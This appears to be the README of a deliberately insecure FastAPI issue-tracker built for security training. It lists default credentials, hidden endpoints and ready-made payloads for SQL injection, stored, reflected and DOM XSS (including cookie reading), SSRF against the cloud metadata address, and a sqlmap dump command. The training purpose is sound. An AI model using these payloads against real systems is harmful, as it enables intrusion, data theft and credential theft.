# VulnIssueTracker

VulnIssueTracker is a **deliberately insecure** FastAPI + SQLite issue tracking platform built for SOC, blue-team, and application security training.

## Disclaimer
Educational use only. Do not deploy in production.

## Features
- Registration, login, logout
- User/admin roles
- Create/edit/delete issues
- Comments
- File uploads
- Search
- Admin dashboard
- JSON API endpoints
- Hidden internal endpoints (`/superadmin`, `/backup.sql`)
- Activity log page
- Bootstrap UI

## Default credentials
- `admin / admin123`
- `alice / password`

## Setup
```bash
python -m venv venv
source venv/bin/activate
pip install -r requirements.txt
uvicorn app.main:app --host 0.0.0.0 --port 8000
```

## Attack payload examples
### SQL Injection
- Login bypass username: `' OR 1=1 --`
- Search dump style payload: `' UNION SELECT 1,sql,'x','x',1,'x','x' FROM sqlite_master --`

### XSS
- Stored XSS comment: `<script>fetch('/api/user/1').then(r=>r.text()).then(alert)</script>`
- Reflected XSS query: `?q="><img src=x onerror=alert(1)>`
- DOM XSS: `/#<img src=x onerror=alert(document.cookie)>`

### SSRF
- `/fetch?url=http://169.254.169.254/latest/meta-data/`

### sqlmap
```bash
sqlmap -u "http://127.0.0.1:8000/issues?q=test" --dbms=SQLite --dump
```
